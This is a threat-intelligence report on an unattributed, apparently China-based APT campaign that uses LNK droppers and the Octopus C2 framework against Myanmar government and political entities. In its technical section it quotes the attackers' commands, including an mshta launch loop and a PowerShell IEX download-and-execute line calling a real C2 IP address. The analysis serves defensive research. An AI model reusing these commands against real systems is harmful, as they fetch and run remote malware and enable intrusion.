Overview
Anomali Threat Research has identified malicious activity targeting entities based in Myanmar
(Burma) that appears to have begun in March 2020; this is based on file names and payload
compilation times. An unidentified Advanced Persistent Threat (APT), very likely China-based, is
distributing Windows Shortcut (LNK) files that are being renamed and distributed to multiple targets,
likely via spearphishing. Anomali Threat Research found these LNK files located inside multiple,
uniquely-named RAR, TGZ, and ZIP files. The RAR and ZIP files are hosted on Google Drive, this is
very likely a tactic to avoid antivirus detection. The group uses the PowerShell-based, Red Teaming
tool Octopus for Command and Control (C2) communication.
In addition, Anomali Threat Research found that the LNK file closely resembles the one used by the
China-based APT, Mustang Panda. Anomali Threat Research does not believe that this group is
responsible for this activity. This similarity may potentially indicate a sharing of tools, which is common
amongst some state-sponsored groups, or perhaps a similar tool that is used to target specific
geographic regions. At the time of this writing, Anomali Threat Research cannot attribute this APT
activity to any specific group. The renamed LNK files are shown in Table 1 below.

Targeting
China-sponsored APT groups are known to target countries in which the government of the People’s
Republic of China is investing in, as part of its Belt and Road Initiative. This has also been observed
by Anomali Threat Research analysis of the China-based APT, Mustang Panda. China and Myanmar
(Burma) have had multiple instances of economic activity and agreements in 2020, as of this writing,
and the two countries share a complex history that often resulted in conflict.[1] In January 2020,
President Xi Jinping visited Myanmar and State Counselor Aung San Suu signed 33 agreements
concerning projects as part of the Belt and Road Initiative.[2] China is also one of the largest investors
in Myanmar, accounting for a quarter of all Myanmar’s investment, and is Myanmar’s largest export
partner.[3] Anomali Threat Research believes that because of these economic factors, in addition, to
file names and compilation times, similar malicious functionality to previously-attributed China-based
groups and geographic location of potential targets, that this activity very likely originates from a
China-based source.

Potentially-Targeted Entities
These possible targets are based specifically on file names identified by Anomali Threat Research.
Myanmar Police Force (MPF)
National Crisis Management Center (NCMC)
National League for Democracy (NLD)
Office of Chief of Military Security Affairs (OCMSA)
The economic activity between China and Myanmar that is of particular interest to Anomali Threat
Research is the Myanmar Yatai International Holding Group’s, a subsidiary of China’s Yatai Group,
investment into the development of 25.5 acres in Kayin State, Myanmar.[4] There are dubious details
2/10

concerning the urban development in the acreage near the Thailand border, which was approved by
the Myanmar Investment Commission, and discussed by a director of Myanmar’s Directorate of
Investment Company Administration (DICA); who confirmed the land was for 59 villas in three years.[5]
In early-March 2020, the Myanmar Yatai International Holding Group claimed that the first phase of
development covered 214 acres, instead of the 25.5 acres approved by the government in an area
controlled by Kayin State.[6] The claim in March 2020 may be a potential catalyst, or purposefully
alignment, for this campaign.

Technical Analysis
Threat actors very likely distributing spearphishing emails with links to download an attachment from
Google Drive. Utilizing Google Drive is a known tactic used by actors to evade antivirus and security
scanners from identifying the malicious files. Once a user navigates to the Drive URL that a ZIP or
RAR file that contains a weaponized Windows Shortcut file will be downloaded on the target host. The
LNK file utilized in the campaign contains an embedded HTA file with VBscript that, once executed,
will drop and run an executable in the background and communicates with the Command and Control
(C2).

LNK File Analysis
Once the user opens the LNK file, the below command gets executed. The command looks for a file
that contains *2020*.LNK and proceeds to execute via mshta.exe.
LNK metadata
Machine ID: win-luu9i5otui2
MAC Address: 00:0c:29:5a:a6:25
MAC Vendor: VMWARE
Creation: 2019-08-05 01:31:57

Command
/c for %x in (%temp%=%cd%) do for /f "delims==" %i in ('dir /s /b "%x *2020*.LNK"') do start
%TEMP:~-2,1%shta "%i"

After the command execution, it writes an executable named f.exe in the “C:userspublic.exe”
directory. The file f.exe is then executed using Windows Management Instrumentation (WMI) in a
hidden window via WMI Tasks.

It is worth noting that the LNK file with an embedded HTA file is very similar to Mustang Panda’s initial
dropper, however, Anomali Threat Research could not attribute this activity to the group.
The executable f.exe uses the Living off the Land (LOLbin) technique to launch cmd.exe via the
ShellExec_RunDLL function. The below command uses Powershell to download and execute the
second stage payload from the C2 server.
"C:WindowsSystem32
undll32.exe" SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c powershell IEX (New-Object
Net.WebClient).DownloadString('http://193.29.59.130/index');"

The downloaded file index is a PowerShell script that was found to be a publicly available Octopus
C2 framework agent as shown in Figure 3.[7]

Figure 3 - Octopus C2 agent comparison
The Octopus agent fingerprints the host and sends the collected information back to C2 as part of the
encrypted HTTP header as shown in Figure 4. The Octopus agent can be used to download further
payloads or perform additional activity onto the infected host.

Network Pivoting for Additional Samples

Using the IP address 193.29.59[.]130 as a pivot point Anomali Threat Research was able to find a
new sample named D0CX_OCMSA Russia Army Weppon Ferrence to Thailand Archive.exe from
Hybrid-analysis.com as shown in Figure 5.

Upon pivoting using the IP address 23.106.122.234, Anomali Threat Research was able to identify the
PowerShell-based Octopus agent from the C2 server as shown in Figure 7 below.

Conclusion
The malicious activity identified by Anomali Threat Research appears to align with techniques that
would be used by a China-based group. Following the Belt and Road Initiative can often result in
identifying malicious activity that coincides with China-based groups’ Tactics, Techniques, and
Procedures (TTPs). The specificity in file names associated with Myanmarese entities, similar LNK
functionality to known China-sponsored APTs, as well as economic and geographical factors, lead
Anomali Threat Research to believe that China-based APT is responsible for this campaign.
